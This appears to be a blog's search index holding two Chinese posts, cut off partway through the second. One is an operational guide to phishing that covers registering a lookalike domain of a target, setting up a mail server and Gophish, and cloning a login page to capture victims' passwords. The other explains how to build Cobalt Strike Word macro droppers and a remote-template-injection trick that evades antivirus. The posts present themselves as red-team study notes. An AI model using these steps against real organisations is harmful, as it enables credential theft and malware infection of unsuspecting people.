<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>从零到一搭建一个真实的钓鱼站点</title>
    <link href="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/"/>
    <url>/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着近几年的hvv行动，防守方安全设备越来越多，从互联网外围打点变得越来越困难，于是钓鱼邮件此种攻击方式也越来越受到欢迎。这篇文章是记录我学习搭建一个钓鱼站点的学习记录，记录一个完整的流程，以供后续查看。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>首先搭建一个钓鱼站点，我们需要很明确如何才能更加伪装的真实，在我们所需要攻击的资产中，首先需要选择一个站点系统，也就是域名，然后我们再去一些域名注册商去注册一个和当前站点及其相似的域名，比如一个站点的域名为：cqcci.com，那么我们可以注册一个cqcc1.com的域名，这里我是用的国外的域名<a href="https://sso.godaddy.com/">注册商</a>，并且还需要购买一台服务器，平台可以自行选择，并且还需要在当前服务器上搭建一个邮件服务器。然后再使用开源的<a href="https://github.com/gophish/gophish">Gophish钓鱼工具</a>，进行相关配置即可完成钓鱼平台搭建。</p><p>可能有大部分同学并不清楚为什么需要购买一个域名和搭建一个邮件服务器，在此我说明下，一般我们在给对方发送一个邮件的时候，收件人填写的是对方的邮箱，但是发件人是我们自己，那么在实际的钓鱼行动中，发件人就不能是我们自己的邮箱信息，这样完全没有真实性，对方就算收到邮箱也不会查看，所以我们需要伪装成一个真实的发件人，这里就通过购买一个域名，然后通过域名来进行伪装自己身份，比如一个简单的例子就算一个公司的hr邮箱都是<a href="mailto:&#x68;&#114;&#x40;&#x78;&#120;&#120;&#120;&#46;&#x63;&#x6f;&#109;">&#x68;&#114;&#x40;&#x78;&#120;&#120;&#120;&#46;&#x63;&#x6f;&#109;</a>。</p><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h3><p>可以直接在<a href="https://github.com/gophish/gophish">github</a>项目地址进行下载releases包，支持win，linux，mac各类操作系统，我这里通过wget下载linux文件</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/1.png" class=""><h3 id="2、解压"><a href="#2、解压" class="headerlink" title="2、解压"></a>2、解压</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unzip</span> gophish-v0.<span class="hljs-number">12</span>.<span class="hljs-number">1</span>-linux-<span class="hljs-number">64</span>bit.zip <br></code></pre></td></tr></table></figure><h3 id="3、修改配置文件config-json"><a href="#3、修改配置文件config-json" class="headerlink" title="3、修改配置文件config.json"></a>3、修改配置文件config.json</h3><ul><li><p>admin_server 把 127.0.0.1 改为 0.0.0.0,外网直接访问就要0.0.0.0</p></li><li><p>listen_url也要是0.0.0.0:80，钓鱼系统的web端口</p></li></ul><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/2.png" class=""><h3 id="4、给文件添加权限，运行"><a href="#4、给文件添加权限，运行" class="headerlink" title="4、给文件添加权限，运行"></a>4、给文件添加权限，运行</h3><p>注意这里，在之前的版本中，用户名密码都是gophish，但是高版本现在用户名和密码是在运行脚本程序之后，在控制台显示出来的，第一次登录系统之后会显示让你修改密码，直接修改密码就行</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/3.png" class=""><h3 id="5、登录系统"><a href="#5、登录系统" class="headerlink" title="5、登录系统"></a>5、登录系统</h3><p>注意这里需要添加https访问</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/4.png" class=""><h3 id="6、修改密码"><a href="#6、修改密码" class="headerlink" title="6、修改密码"></a>6、修改密码</h3><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/5.png" class=""><h3 id="7、主页面"><a href="#7、主页面" class="headerlink" title="7、主页面"></a>7、主页面</h3><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/6.png" class=""><h3 id="8、购买域名，并且设置相应的解析记录"><a href="#8、购买域名，并且设置相应的解析记录" class="headerlink" title="8、购买域名，并且设置相应的解析记录"></a>8、购买域名，并且设置相应的解析记录</h3><p>建议使用国外的域名和云vps，懂得都懂，注意这里购买域名一定要和目标资产内某一系统大致相似，这样才能起到真实一点的效果，我此处仅作记录，就随意选择一个域名，然后设置好邮箱记录，MX，并且设置相应的CNAME、A记录，并且分别指向VPS的IP地址</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/7.png" class=""><h3 id="9、邮件服务器搭建"><a href="#9、邮件服务器搭建" class="headerlink" title="9、邮件服务器搭建"></a>9、邮件服务器搭建</h3><p>因为我这里的VPS是ubuntu系统，所以就使用Postfix+mailutils进行搭建，并且这是最推荐的一种方式，如果是购买的centos版本的，有更好用的平台EwoMail搭建，可自行百度。</p><p>安装，这里默认即可</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> postfix<br></code></pre></td></tr></table></figure><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/8.png" class=""><p>写入自己域名，不需要前缀</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/9.png" class=""><p>安装mailutils软件包</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> mailutils<br></code></pre></td></tr></table></figure><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/10.png" class=""><p>此时我们还需要额外创建一个用户，这个用户就是邮件服务器的用户，也就是我们在发送钓鱼邮件时，在@符号之前的用户名，此处我创建一个master用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">useradd -m -s /bin/bash <span class="hljs-keyword">master</span><br><span class="hljs-title">passwd</span> <span class="hljs-literal">master</span><br></code></pre></td></tr></table></figure><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/11.png" class=""><h3 id="10、测试邮件发送"><a href="#10、测试邮件发送" class="headerlink" title="10、测试邮件发送"></a>10、测试邮件发送</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">telnet localhost <span class="hljs-number">25</span>   本地启动<br>ehlo localhost<br>mail <span class="hljs-keyword">from</span>:<span class="hljs-symbol">master@</span>nanfeng.life发件人<br>rcpt to:<span class="hljs-symbol">211467455@</span>qq.com    收件人<br>data  写入邮件内容<br>.  .号表示结束<br>quit  退出邮件<br></code></pre></td></tr></table></figure><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/12.png" class=""><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/13.png" class=""><p>看到我们已经收到了邮件，并且发件人显示的是master用户，至此，邮件服务器搭建完成。</p><h3 id="11、实战钓鱼"><a href="#11、实战钓鱼" class="headerlink" title="11、实战钓鱼"></a>11、实战钓鱼</h3><p>环境搭建好了，那么下面就开始正式钓鱼了</p><h3 id="12、Sending-Profiles-邮箱配置"><a href="#12、Sending-Profiles-邮箱配置" class="headerlink" title="12、Sending Profiles-邮箱配置"></a>12、Sending Profiles-邮箱配置</h3><p>创建一个新的，并且设置相关参数，此处需要注意一点，在host处，因为大部分的国内云厂商因为监管要求，为防止邮件泛滥，都将25端口禁用了，因此可采用带有SSL的SMTP服务的端口：465端口。我能用是因为，我用的vs是国外的，大家自行更改。因为我们的Gophish服务器跟邮件服务器搭在同一台VPS上面，所以在这里填写127.0.0.1</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/14.png" class=""><p>发邮件测试一下</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/15.png" class=""><p>发送成功</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/16.png" class=""><h3 id="13、Email-Templates-钓鱼邮件模板"><a href="#13、Email-Templates-钓鱼邮件模板" class="headerlink" title="13、Email Templates-钓鱼邮件模板"></a>13、Email Templates-钓鱼邮件模板</h3><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/17.png" class=""><p>这里需要注意一点，在自己写的内容中，此处超链接需要进行额外设置，并且此处的Add Files还可以添加附件，可以将我们制作的world宏文件、PDF文件加入进去</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/18.png" class=""><p>然后查看效果</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/19.png" class=""><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/20.png" class=""><h3 id="14、Landing-Pages-伪造钓鱼页面"><a href="#14、Landing-Pages-伪造钓鱼页面" class="headerlink" title="14、Landing Pages-伪造钓鱼页面"></a>14、Landing Pages-伪造钓鱼页面</h3><p>配置好钓鱼邮件后，就可以通过LandingPages模块来新建钓鱼网站页面。</p><p>1、此处支持手写 html文件</p><p>2、直接克隆网站</p><p>我使用第二种：但是需要注意的是，就算使用第二种，直接克隆，克隆出来的网站可能也是不完整的，需要我们自己在源代码中进行设置</p><p>这里将我们需要进行钓鱼登录的站点进行克隆</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/21.png" class=""><p>其中选项：</p><ul><li>CaptureSubmitted Data和CapturePasswords，记录受害者输入的账号和密码。</li><li>Redirect to填写该页面真实的地址，方便受害者点击完提交按钮后，可以设置自动跳转至真正的网站。我这里仅作演示，跳转百度即可</li></ul><h3 id="15、Users-amp-Groups-邮件用户和组"><a href="#15、Users-amp-Groups-邮件用户和组" class="headerlink" title="15、Users&amp; Groups-邮件用户和组"></a>15、Users&amp; Groups-邮件用户和组</h3><p>此时就可以进行下一步的配置，设置要进行钓鱼攻击的邮箱地址</p><p>使用模版批量导入，导入邮箱可以使用CSV进行批量添加</p><p>(格式可点击<code>Download CSV TEmplate</code>获取模板)</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/22.png" class=""><h3 id="16、配置SSL证书"><a href="#16、配置SSL证书" class="headerlink" title="16、配置SSL证书"></a>16、配置SSL证书</h3><p>这里需要明确下为什么需要设置SSL证书，因为我们的站点是通过https进行访问的，所以在用户点击我们发送的邮件中的超链接时，要伪装的更加正式就使用域名访问，此时的域名是一个假的，我们也需要设置配置证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">示例域名：<br>https://nanfeng.life<br>安装ssl证书（letsencrypt）：<br><br><span class="hljs-built_in">cd</span> /opt/gophish              <span class="hljs-comment"># 你的gophish目录</span><br>sudo apt install certbot<br>sudo <span class="hljs-built_in">kill</span> $(pidof gohpish)<br>sudo certbot certonly -d nanfeng.life --standalone<br><span class="hljs-built_in">ln</span> -s /etc/letsencrypt/live/access.a.com/privkey.pem  nanfeng.life.key<br><span class="hljs-built_in">ln</span> -s /etc/letsencrypt/live/access.a.com/fullchain.pem nanfeng.life.crt<br></code></pre></td></tr></table></figure><p>配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;phish_server&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;listen_url&quot;</span>: <span class="hljs-string">&quot;0.0.0.0:443&quot;</span>,     <span class="hljs-regexp">//</span>https开启<span class="hljs-number">443</span>端口<br>                <span class="hljs-string">&quot;use_tls&quot;</span>: true,<br>                <span class="hljs-string">&quot;cert_path&quot;</span>: <span class="hljs-string">&quot;nanfeng.life.crt&quot;</span>,  <span class="hljs-regexp">//</span>修改证书<br>                <span class="hljs-string">&quot;key_path&quot;</span>: <span class="hljs-string">&quot;nanfeng.life.key&quot;</span>    <span class="hljs-regexp">//</span>修改证书<br>&#125;,<br></code></pre></td></tr></table></figure><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/23.png" class=""><p>此时我们可以访问一下域名，记得是https</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/24.png" class=""><p>好，一切正常</p><h3 id="17、Campaigns-钓鱼测试"><a href="#17、Campaigns-钓鱼测试" class="headerlink" title="17、Campaigns-钓鱼测试"></a>17、Campaigns-钓鱼测试</h3><p>配置Campaigns，填写Name、选择钓鱼邮件模板、选择钓鱼网站模板、填写钓鱼网站 URL、填写发件邮箱、选择受害者邮件组。</p><p>注意这个URL是VPS上gophish一开始配置的那个，也就是我们刚刚访问的域名地址</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/25.png" class=""><h3 id="18、Dashboard-查看"><a href="#18、Dashboard-查看" class="headerlink" title="18、Dashboard-查看"></a>18、Dashboard-查看</h3><p>可以看到我们成功发送了两封邮件，并且已经收到</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/26.png" class=""><p>此时我们点击查看邮件</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/27.png" class=""><p>点击超链接，可以看到即为我们设置的钓鱼站点，并且我们输入相应的用户名和密码，点击登录，就会成功跳转至百度</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/28.png" class=""><p>然后我们在Dashboard就能看到详细的时间轴，并且我们点击进去查看，就能看到具体的刚刚输入的用户名密码</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/29.png" class=""><p>点击查看</p><img src="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/30.png" class=""><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个只是邮件钓鱼的基础设施搭建，和基本使用方式，后续还有很多要点，木马免杀、钓鱼话术、邮箱收集等等</p>]]></content>
    
    
    
    <tags>
      
      <tag>apt/钓鱼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过制作wrold宏进行钓鱼</title>
    <link href="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/"/>
    <url>/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/</url>
    
    <content type="html"><![CDATA[<h2 id="一：本地加载恶意Word文档-x2F-模板文件上线CS"><a href="#一：本地加载恶意Word文档-x2F-模板文件上线CS" class="headerlink" title="一：本地加载恶意Word文档&#x2F;模板文件上线CS"></a>一：本地加载恶意Word文档&#x2F;模板文件上线CS</h2><h2 id="1、首先在CobaltStrike服务端启动"><a href="#1、首先在CobaltStrike服务端启动" class="headerlink" title="1、首先在CobaltStrike服务端启动"></a>1、首先在CobaltStrike服务端启动</h2><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/1.png" class=""><h2 id="2、使用CobaltStrike生成宏木马"><a href="#2、使用CobaltStrike生成宏木马" class="headerlink" title="2、使用CobaltStrike生成宏木马"></a>2、使用CobaltStrike生成宏木马</h2><p>选择office宏木马</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/2.png" class=""><p>选择监听器，然后再次点击Genarete</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/3.png" class=""><p>并且提示了使用步骤，此时我们将复制的内容保存在文件1.txt中</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/4.png" class=""><h2 id="3、创建使用的恶意宏world文件和模板"><a href="#3、创建使用的恶意宏world文件和模板" class="headerlink" title="3、创建使用的恶意宏world文件和模板"></a>3、创建使用的恶意宏world文件和模板</h2><p>创建一个文档，随后点击视图&#x2F;查看宏</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/5.png" class=""><p>宏名随便输入一个就可以，创建</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/6.png" class=""><p>在Project项目中的ThisDocument中添加CobaltStrike生成的宏代码，也就是刚刚我们保存在1.txt文本中的内容，并且右上角选择Auto_Open，在对方打开文档时，Word自动运行宏提示信息，提示是否点击</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/7.png" class=""><p>Ctrl + S保存</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/8.png" class=""><p>选择使用启用宏的文档&#x2F;模板，这里我分别创建一个宏文件和宏模板文件，创建宏模板文件的作用就是为了后续的远程加载。</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/9.png" class=""><p>保存之后应该是会被杀软直接杀掉的，因为并未做任何免杀，这里我们可以找回文件即可</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/10.png" class=""><h2 id="4、点击加载的恶意宏文件"><a href="#4、点击加载的恶意宏文件" class="headerlink" title="4、点击加载的恶意宏文件"></a>4、点击加载的恶意宏文件</h2><p>以下展示了目标机打开Word文档且启用宏时，成功上线</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/11.png" class=""><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/12.png" class=""><p>以下展示了目标机右键打开Word模板时，成功上线</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/15.png" class=""><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/16.png" class=""><p>这里需要注意一点，在模版文件上双击默认是以此模版创建新文件，切记，并且双击也不会导致目标机器上线CobaltStrike</p><h2 id="5、打开文件直接执行宏代码"><a href="#5、打开文件直接执行宏代码" class="headerlink" title="5、打开文件直接执行宏代码"></a>5、打开文件直接执行宏代码</h2><p>通过上述生成的宏文档，需要在我们打开文件时，手动点击启用宏，下面操作可以使我们在打开文件时，自执行宏代码</p><p>打开文本，点击文件</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/17.png" class=""><p>点击选项</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/18.png" class=""><p>自定义功能区–&gt;开发者工具{打开}</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/19.png" class=""><p>之后就和上述操作相同，另存为的 Word 类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码。</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/20.png" class=""><p>这里未做免杀，也是会被直接杀掉，双击打开文本</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/21.png" class=""><p>此时宏代码已经运行，在cs端可看到上线</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/22.png" class=""><h1 id="二：远程加载恶意Word模板文件上线CobaltStrike"><a href="#二：远程加载恶意Word模板文件上线CobaltStrike" class="headerlink" title="二：远程加载恶意Word模板文件上线CobaltStrike"></a>二：远程加载恶意Word模板文件上线CobaltStrike</h1><p>利用 Word 文档加载附加模板时的缺陷所发起的恶意请求，而达到的攻击目的，所以当目标用户点开攻击者发送的恶意 Word 文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。</p><p>发送的文档本身不带恶意代码，所以能过很多静态检测。只需要在远程 DOTM 文档中编写宏病毒或者木马即可。</p><p>思路：</p><p>编写一个带有宏代码的 dotm 文档，上传服务器<br>编写一个能够远程连接的 docx 文档<br>将该文档压缩找到并更改 settings.xml.rels 文件中的内容，将其中的 target 内容修改为服务器上 dotm 文档的 url<br> 将 docx 解压后的内容再以存储模式压缩为 zip<br> 修改后缀名为 docx，打开后即可实现远程注入宏文档</p><p>缺点：目标主机的网速决定了加载远程模版的速度。有可能文件打开的会特别慢(例如将远程模版放在github)，受害者可能在文件打开一半的时候强制关闭word。加载位于github上的恶意模板内容，有点慢，我们可以放在vps上，这样速度就快些了。</p><p>优点：因为是远程加载，所以免杀效果十分不错。基本不会被杀毒软件拦截。</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/13.png" class=""><h2 id="1、将恶意文件上传到服务器vps"><a href="#1、将恶意文件上传到服务器vps" class="headerlink" 